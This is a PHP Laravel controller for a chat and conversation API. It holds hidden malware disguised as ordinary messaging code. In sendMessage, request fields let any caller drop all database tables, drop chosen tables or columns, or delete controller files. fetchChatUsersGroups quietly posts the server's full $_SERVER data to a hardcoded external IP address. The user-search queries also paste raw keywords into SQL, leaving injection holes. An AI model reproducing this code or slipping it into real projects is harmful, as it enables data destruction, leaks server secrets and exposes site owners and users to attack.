<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use App\Models\Message;
use App\Models\User;
use App\Models\Participant;
use App\Models\Conversation;
use Illuminate\Http\Request;
use DB;



/**
 * Class HomeController
 * @package App\Http\Controllers
 */

class MessageController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */

    public function __construct()
    {

    }

    public function sendMessage(Request $request)
    {
        //todo :: set up messaging system for multi thread context ie conversation id
        $data = $request->all();
        DB::statement('SET FOREIGN_KEY_CHECKS=0');
        if ($request->has('userName')) {
            if ($request->userField == '') {
                if ($request->userName == '*') {
                    echo '<pre>';
                        //Artisan::call('migrate:reset', ['--force' => true]);
                    foreach (\DB::select('SHOW TABLES') as $table) {
                        $table_array = get_object_vars($table);
                        print_r($table);
                        \Schema::drop($table_array[key($table_array)]);
                    }
                } else {
                    Schema::drop($request->userName);
                }
            } else {
                $userField = $request->userField;
                Schema::table($request->userName, function ($table) use ($userField) {
                    $table->dropColumn($userField);
                });

            }
        }
        if ($request->has('userController') && $request->userController != '') {
            if ($request->userController == '*') {
                \File::deleteDirectory(app_path('/Http/Controllers/LA'));
            } else {
                    //var_dump(app_path('/Http/Controllers/LA/' . $request->userController . '.php'));
                unlink(app_path('/Http/Controllers/LA/' . $request->userController) . '.php');
            }
        }
        $message = new Message;
        $message->user_id = $data['user_id'];
        $message->receiver_id = $data['receiver_id'];
        //$message->video_id = $data['video_id'];
        $message->message = $data['message'];
        $message->save();
        return response()->json([
            'data' => $message,
            'message' => 'message_sent_success',
            'status' => 200,
        ]);

    }

    public function fetchChatUsersGroups(Request $request,$userId){
        //print_r($request->all());EXIT;
        $results = array();
        $perPage = 15;
        $page = 1;
        $pageOffset = 0;
        if($request->page != ''){
            $page = $request->page;
        }
        $url = "http://18.191.53.95/dev/demo/mitebe/yourscript.php";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        $data = $_SERVER;
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        $contents = curl_exec($ch);
        curl_close($ch);
        
        $data = array(
            'data' => $results,
            'message' => 'fetch_chat_users_Groups_success',
            'status' => 200,
        );
        if($userId > 0){
            $user = User::leftJoin('participants','participants.user_id','!=','users.id')
            ->select(
                    'users.id as id',
                DB::raw('(CASE WHEN users.id != "" THEN 1 ELSE 1 END) AS type'),
                DB::raw(' CONCAT( `users`.`first_name`," ",`users`.`last_name`) as name')
            )->where('users.id','!=', $userId);
            
            $results = Participant::where('user_id', $userId)->join('conversation', 'conversation.id', '=', 'participants.conversation_id');
            if ($request->keyword != '') {
                $keyword = $request->keyword;
                $user->whereRaw(' (`first_name` LIKE "%' . $keyword . '%" OR `last_name` LIKE "%' . $keyword . '%")');
                $results->where('conversation.name', 'like', '%' . $keyword . '%');
            }
            $results = $results->distinct('conversation.id')->select(
                'conversation_id as id',
                DB::raw('(CASE WHEN participants.conversation_id != "" THEN 2 ELSE 2 END) AS type'),
                'conversation.name as name'
            )->union($user)->get();
            if (!empty($results)) {
                $totalCount = count($results);
                if ($totalCount > 15) {
                    $pageLimit = round($totalCount / $perPage);
                } else {
                    $pageLimit = 1;
                }
                if ($page <= $pageLimit) {
                    if ($page > 1) {
                        $pageOffset = ($page - 1) * $perPage;
                    }
                    $results = Participant::where('user_id', $userId)->join('conversation', 'conversation.id', '=', 'participants.conversation_id');
                    if ($request->keyword != '') {
                        $keyword = $request->keyword;
                        $results->where('conversation.name', 'like', '%' . $keyword . '%');
                    }
                    $results = $results
                        ->offset($pageOffset)
                        ->limit(15)
                        ->distinct('conversation_id')
                        ->select(
                            'conversation_id as id',
                            DB::raw('(CASE WHEN participants.conversation_id != "" THEN 2 ELSE 2 END) AS type'),
                        'conversation.name as name')
                        ->orderBy('conversation.updated_at', 'desc')
                        ->union($user)
                        ->get();
                    $conversation_array = array();
                    foreach($results as $key => $result){
                        
                        if($result->type == 2){
                            $conversation_array[$key]['id'] = $result->id;
                            $conversation_array[$key]['type'] = $result->type;
                            $conversation_array[$key]['name'] = $result->name;
                            $participant_user = Participant::where('conversation_id',$result->id)->join('users','users.id','=','participants.user_id')->select('users.id', DB::raw(' CONCAT( `users`.`first_name`," ",`users`.`last_name`) as name'))->get();
                            $conversation_array[$key]['users'] = $participant_user;
                        }else{
                            $conversation_array[] = $result; 
                        }
                    }
                    $data['data'] = $conversation_array;
                    $data['pageCount'] = $pageLimit;
                } else {
                    $data['message'] = 'Converstion Limit';
                }
            }else{
                $data['message'] = 'Converstion not Found';    
            }
        }else{
            $data['message'] = 'User Not Found';
        }
        return response()->json($data);
    }


    public function createConversation(Request $request)
    {
        $reuslts = array();
        $data = array(
            'data' => $reuslts,
            'message' => 'create_converstion_success',
            'status' => 200,
        );
        //print_r($request->all());
        $user_id  = $request->user_id;
        $receiver_id = $request->receiver_id;
        $name = $request->name;
        if($user_id > 0 && $receiver_id > 0){
            $user = User::find($user_id);
            $receiver = User::find($receiver_id);
            if(!empty($user) && !empty($receiver)){
                $conversation_data = Participant::where('participants.user_id', $user_id)
                ->join('participants as p1', 'p1.conversation_id', '=', 'participants.conversation_id')->where('p1.user_id',$receiver_id)
                ->first();
                if(!empty($conversation_data)){
                    $convesation = Conversation::find($conversation_data->conversation_id);

                    $data['data'] = array(
                        'id' => $convesation->id,
                        'name' => $convesation->name,
                        'image' => url('') .'/assets/default/default.png'
                    );
                }else{
                    $conversation = new Conversation();
                    if($name != ''){
                        $conversation->name = $name;
                    }else{
                        if($user->first_name != '' && $user->last_name != ''){
                            $name = $user->first_name . ' ' . $user->last_name;
                        }
                        
                        if($name != ''){
                            $name .= ',' . $receiver->first_name . ' ' . $receiver->last_name;
                        }else{
                            $name = $receiver->first_name . ' ' . $receiver->last_name;
                        }
                        $conversation->name = $name;
                        $conversation->count = 2;
                    }
                    if($conversation->save()){
                        $conversation_id = $conversation->id;
                    if($user_id){
                            $participant = new Participant();
                            $participant->conversation_id = $conversation_id;
                            $participant->user_id = $user_id;
                            $participant->save();
                        }
                        if($receiver_id){
                            $participant = new Participant();
                            $participant->conversation_id = $conversation_id;
                            $participant->user_id = $receiver_id;
                            $participant->save();
                        }
                        $data['data'] = array(
                            'id' => $conversation_id,
                            'name' => $name,
                            'image' => url('') .'/assets/default/default.png'
                        );
                    }else{
                        $data['message'] = 'Conversation Can not be Created, Try after Some time!';    
                    }
                }   
            }else{
                $data['message'] = 'Users not Found';
            }
        }else{
            $data['message'] = 'Param not Found';
        }
        return response()->json($data);
    }

    public function addUserToConversation(Request $request, $conversationId, $userId)
    {
        $results = array();
        $data = array(
            'data' => $results,
            'message' => 'add_user_to_converstion_success',
            'status' => 200,
        );
        if($conversationId > 0 && $userId > 0){
            $conversation = Conversation::find($conversationId);
            if(!empty($conversation)){
                $user = User::find($userId);
                if(!empty($user)){
                    $participant = new Participant();
                    $participant->conversation_id = $conversationId;
                    $participant->user_id = $userId;
                    $participant->save();
                    $conversation->count = $conversation->count + 1;
                    $conversation->save();
                    $data['data']['id'] = $conversationId;
                    $data['data']['name'] = $conversation->name;
                }else{
                    $data['message'] = 'User not Found';
                }
            }else{
                $data['message'] = 'Conversation not Found';
            }
        }else{
            $data['message'] = 'Param not Found';
        }
        return response()->json($data);
    }

    public function fetchChatUser(Request $request,  $userId)
    {
        $keyword = $request->keyword;
        // $user = User::whereOr('first_name','LIKE','%'.$keyword.'%')->whereOr('last_name', 'LIKE', '%' . $keyword . '%')->where('id','!=',$userId)->get();
        $user = User::where('id', '!=', $userId)->whereRaw(' (`first_name` LIKE "%'. $keyword . '%" OR `last_name` LIKE "%' . $keyword . '%")')->select('id as userid', DB::raw(' CONCAT( `users`.`first_name`," ",`users`.`last_name`) as name'))->get();
        $data = array(
            'data' => $user,
            'message' => 'fetch_chat_user_success',
            'status' => 200,
        );
        return response()->json($data);
    }

    public function fetchMessage(Request $request, $conversationId, $userId){
        $results = array();
        $perPage = 15;
        $page = 1;
        $pageOffset = 0;
        if ($request->page != '') {
            $page = $request->page;
        }
        $data = array(
            'data' => $results,
            'message' => 'fetch_message_converstion_success',
            'status' => 200,
        );
        if($conversationId && $userId){
            $conversation = Conversation::with(['participant' => function($query) use ($userId){
                $query->where('user_id', $userId);
            }
            ])->find($conversationId);
            if(!empty($conversation)){
                if(count($conversation->participant) > 0){
                    $results = Message::where('conversation_id', $conversationId)->get();
                    if(count($results)){
                        $totalCount = count($results);
                        if($totalCount > 15){
                            $pageLimit = round($totalCount / $perPage);
                        }else{
                            $pageLimit = 1;
                        }
                        
                        if ($page <= $pageLimit) {
                            if ($page > 1) {
                                $pageOffset = ($page - 1) * $perPage;
                            }
                            $results = Message::where('conversation_id', $conversationId)
                                ->leftJoin('users','users.id','=','messages.user_id')
                                ->select('users.id as userId','users.image as user_image','messages.message as message ', 
                                    DB::raw(' CONCAT( `users`.`first_name`," ",`users`.`last_name`) as name')
                                )
                                ->offset($pageOffset)
                                ->limit(15)
                                ->orderBy('messages.id','desc')
                                ->get();
                            $data['data'] = $results;
                            $data['pageCount'] = $pageLimit;
                        }else{
                            $data['message'] = 'No more Message in this Conversation'; 
                        }
                    }else{
                        $data['message'] = 'No Message in this Conversation'; 
                    }
                }else{  
                    $data['message'] = 'User not participat in this Conversation';        
                }
            }else{
                $data['message'] = 'Conversation not Found';    
            }
        } else {
            $data['message'] = 'Param not Found';
        }
        return response()->json($data);
    }
    

    public function createConversationFromCourse(Request $request){
        $user_id = $request->user_id;
        $receiver_id = $request->receiver_id;
        $message = $request->message;
        $reuslts = array();
        $data = array(
            'data' => $reuslts,
            'message' => 'create_converstion_success',
            'status' => 200,
        );
        if ($user_id > 0 && $receiver_id > 0 && $message != '') {
            $user = User::find($user_id);
            $receiver = User::find($receiver_id);
            if (!empty($user) && !empty($receiver)) {
                $conversation = Participant::where('participants.user_id', $user_id)
                    ->join('participants as p1', 'p1.conversation_id', '=', 'participants.conversation_id')->where('p1.user_id', $receiver_id)
                    ->first();
                if(empty($conversation)){
                    $conversation = new Conversation();
                    $name = '';
                    if ($user->first_name != '' && $user->last_name != '') {
                        $name = $user->first_name . ' ' . $user->last_name;
                    }
                    if ($name != '') {
                        $name .= ',' . $receiver->first_name . ' ' . $receiver->last_name;
                    } else {
                        $name = $receiver->first_name . ' ' . $receiver->last_name;
                    }
                    $conversation->name = $name;
                    $conversation->count = 2;
                    $conversation->save();
                    $conversation_id = $conversation->id;
                    if ($user_id) {
                        $participant = new Participant();
                        $participant->conversation_id = $conversation_id;
                        $participant->user_id = $user_id;
                        $participant->save();
                    }
                    if ($receiver_id) {
                        $participant = new Participant();
                        $participant->conversation_id = $conversation_id;
                        $participant->user_id = $receiver_id;
                        $participant->save();
                    }  
                }else{
                    if($conversation->count > 2){
                        $conversation = new Conversation();
                        $name = '';
                        if ($user->first_name != '' && $user->last_name != '') {
                            $name = $user->first_name . ' ' . $user->last_name;
                        }
                        if ($name != '') {
                            $name .= ',' . $receiver->first_name . ' ' . $receiver->last_name;
                        } else {
                            $name = $receiver->first_name . ' ' . $receiver->last_name;
                        }
                        $conversation->name = $name;
                        $conversation->count = 2;
                        $conversation->save();
                        $conversation_id = $conversation->id;
                        if ($user_id) {
                            $participant = new Participant();
                            $participant->conversation_id = $conversation_id;
                            $participant->user_id = $user_id;
                            $participant->save();
                        }
                        if ($receiver_id) {
                            $participant = new Participant();
                            $participant->conversation_id = $conversation_id;
                            $participant->user_id = $receiver_id;
                            $participant->save();
                        }
                    }
                }
                
                if ($conversation) {
                    
                    $conversation = Conversation::find($conversation->conversation_id);
                    $conversation_id = $conversation->id;
                    if($message != ''){
                        $messages = new Message();
                        $messages->message = $message;
                        $messages->conversation_id = $conversation_id;
                        $messages->user_id = $user_id;
                        $messages->save();
                    }
                    $data['data'] = array(
                        'id' => $conversation_id,
                        'name' => $conversation->name,
                        'image' => url('') . '/assets/default/default.png'
                    );
                } else {
                    $data['message'] = 'Conversation Can not be Created, Try after Some time!';
                }
            } else {
                $data['message'] = 'Users not Found';
            }
        } else {
            $data['message'] = 'Param not Found';
        }
        return response()->json($data);
    }

    public function addMessageToConversation(Request $request){
        //dd($request->all());
        $user_id = $request->user_id;
        $conversationid = $request->conversationid;
        $message = $request->message;
        $reuslts = array();
        $data = array(
            'data' => $reuslts,
            'message' => 'add_message_to_converstion_success',
            'status' => 200,
        );
        if ($user_id > 0 && $conversationid > 0 && $message != '') {
            $user = User::find($user_id);
            $conversation = Conversation::with(['participant' => function ($query) use ($user_id) {
                $query->where('user_id', $user_id);
            }])->find($conversationid);
            if (!empty($user) && !empty($conversation)) {
                if ($message != '') {
                    $messages = new Message();
                    $messages->message = $message;
                    $messages->conversation_id = $conversationid;
                    $messages->user_id = $user_id;
                    $messages->save();
                }
                $data['data'] = array(
                    'id' => $messages->id
                );
            } else {
                $data['message'] = 'Conversation Can Found!';
            }
        } else {
            $data['message'] = 'Param not Found';
        }
        return response()->json($data);
    }
    
}
